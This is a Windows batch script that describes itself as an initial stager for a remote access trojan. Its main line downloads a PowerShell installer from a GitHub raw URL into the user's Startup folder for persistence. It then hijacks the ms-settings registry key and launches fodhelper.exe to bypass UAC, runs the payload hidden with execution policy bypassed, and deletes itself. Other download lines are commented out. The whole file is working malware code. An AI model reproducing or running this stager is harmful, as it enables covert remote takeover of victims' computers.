@echo off
@REM initial stager for rat

@REM variables
set "INITIALPATH=%cd%"
set "STARTUP=C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"

@REM move into startup dir
cd %STARTUP%

@REM buil out stage two


@REM setup smtp


@REM write payloads to startup

@rem powershell powershell.exe "Invoke-WebRequest -Uri https://raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/files/wget.cmd -OutFile wget.cmd"

@rem powershell powershell.exe "Invoke-WebRequest -Uri https://raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/files/uac1.vbs -OutFile uac1.vbs"
powershell powershell.exe "Invoke-WebRequest -Uri raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/files/installer.ps1" -OutFile "installer.ps1"

@echo off
REM Modify the registry to set the command to run with elevated privileges
reg add HKCU\Software\Classes\ms-settings\shell\open\command /d "cmd.exe /k powershell -ExecutionPolicy Bypass -Command \"& 'C:\\Users\\%username%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\installer.ps1'\"" /f
powershell -windowstyle hidden -ExcutionPolicy Bypass ./installer.ps1

REM Run fodhelper.exe to trigger the elevated command
start fodhelper.exe

pause


@REM run payload
@rem powershell ./wget.cmd; ./uac1

@REM cd back into initial location
cd "%INITIALPATH%"

@REM self delete
del initial.cmd
